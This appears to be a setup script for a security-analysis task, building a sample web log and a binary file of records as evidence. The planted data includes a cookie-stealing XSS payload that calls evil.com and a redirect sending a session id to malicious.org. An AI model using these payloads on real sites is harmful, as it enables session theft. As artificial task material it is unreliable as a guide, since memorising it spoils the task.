#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip gcc libc6-dev
    pip3 install pytest

    mkdir -p /home/user

    cat << 'EOF' > /home/user/httpd_access.log
10.10.10.5 - - [14/Oct/2023:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
192.168.1.105 - - [14/Oct/2023:10:05:00 +0000] "GET /login?redirect=http://malicious.org/exfil?c=session_id=987654321A HTTP/1.1" 302 230 "-" "Mozilla/5.0"
10.10.10.6 - - [14/Oct/2023:10:06:00 +0000] "GET /about.html HTTP/1.1" 200 512 "-" "Mozilla/5.0"
EOF

    python3 -c '
import struct

# Structure: 4 bytes string, 4 bytes uint, 64 bytes string, 1 byte uint -> <4sI64sB
# Record 1
r1 = struct.pack("<4sI64sB", b"EXFL", 0x0A000001, b"Normal application payload", 0)
# Record 2 (XSS)
r2 = struct.pack("<4sI64sB", b"EXFL", 0x0A000002, b"<svg/onload=fetch(\"http://evil.com/?c=\"+document.cookie)>", 1)
# Record 3
r3 = struct.pack("<4sI64sB", b"EXFL", 0x0A000003, b"Another benign request", 0)

with open("/home/user/dropped_data.bin", "wb") as f:
    f.write(r1 + r2 + r3)
'

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
